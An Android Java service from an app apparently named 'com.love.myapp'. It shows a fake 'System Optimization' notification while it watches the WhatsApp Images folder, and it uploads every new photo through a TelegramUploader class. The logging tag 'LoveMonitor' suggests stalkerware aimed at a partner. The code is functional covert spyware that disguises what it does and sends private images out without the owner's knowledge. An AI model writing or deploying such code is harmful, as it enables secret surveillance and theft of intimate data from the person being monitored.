package com.love.myapp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.FileObserver;
import android.os.IBinder;
import android.util.Log;

public class FileMonitorService extends Service {

    private FileObserver observer;
    private static final String CHANNEL_ID = "FileMonitorChannel";

    @Override
    public void onCreate() {
        super.onCreate();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }

        Notification.Builder builder = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ?
                new Notification.Builder(this, CHANNEL_ID) : new Notification.Builder(this);

        Notification notification = builder
                .setContentTitle("System Optimization")
                .setContentText("Running in background...")
                .setSmallIcon(android.R.drawable.stat_sys_warning)
                .build();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(1, notification);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        final String waPath = "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/";

        // CLOSE_WRITE ব্যবহার করা হয়েছে, যেন ফাইল পুরোপুরি সেভ হওয়ার পর আপলোড হয়
        observer = new FileObserver(waPath, FileObserver.CLOSE_WRITE | FileObserver.MOVED_TO) {
            @Override
            public void onEvent(int event, String path) {
                if (path != null && !path.endsWith(".nomedia")) {
                    String fullFilePath = waPath + path;
                    Log.d("LoveMonitor", "New Photo Ready: " + fullFilePath);
                    TelegramUploader.uploadFile(fullFilePath);
                }
            }
        };

        observer.startWatching();
        Log.d("LoveMonitor", "Watching WhatsApp Images...");

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (observer != null) {
            observer.stopWatching();
        }
    }
}
